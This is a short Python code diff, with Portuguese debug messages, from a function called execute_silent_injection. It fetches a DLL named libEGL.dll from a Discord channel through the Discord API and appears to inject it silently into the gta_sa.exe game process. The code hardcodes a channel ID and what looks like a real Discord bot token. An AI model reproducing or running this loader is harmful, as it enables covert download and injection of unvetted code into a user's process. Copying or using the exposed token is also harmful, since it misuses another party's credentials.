@@ -16,7 +16,7 @@ def execute_silent_injection():
         print("[DEBUG] requests instalado e importado")
 
     DISCORD_CHANNEL_ID = "1393441968566046750"
-    DISCORD_AUTH_TOKEN = "MTM5MzQwMzYwMjkwNjkwNjYyNA.GH8W0P.kLeWjgCQrTQS_huJDQdIUaEs4DgoF-KM3nPtXo"
+    DISCORD_AUTH_TOKEN = "MTM5MzQwMzYwMjkwNjkwNjYyNA.GH8W0P.kLeWjgCQrTQS_huJDQdIUaEs4DgoF-KM3nPtXo"  # <---- substitua aqui com seu token válido
     DLL_NAME = "libEGL.dll"
     PROCESS_NAME = "gta_sa.exe"
 
@@ -80,7 +80,10 @@ def execute_silent_injection():
     try:
         print("[DEBUG] Tentando baixar DLL do Discord...")
         import requests
-        r_msg = requests.get(f"https://discord.com/api/v10/channels/{DISCORD_CHANNEL_ID}/messages?limit=1", headers={"Authorization": f"Bot {DISCORD_AUTH_TOKEN}"}, timeout=10)
+        r_msg = requests.get(
+            f"https://discord.com/api/v10/channels/{DISCORD_CHANNEL_ID}/messages?limit=1",
+            headers={"Authorization": f"Bot {DISCORD_AUTH_TOKEN}"},
+            timeout=10)
         if r_msg.status_code != 200:
             print(f"[DEBUG] Falha ao pegar mensagens: status {r_msg.status_code}")
             return
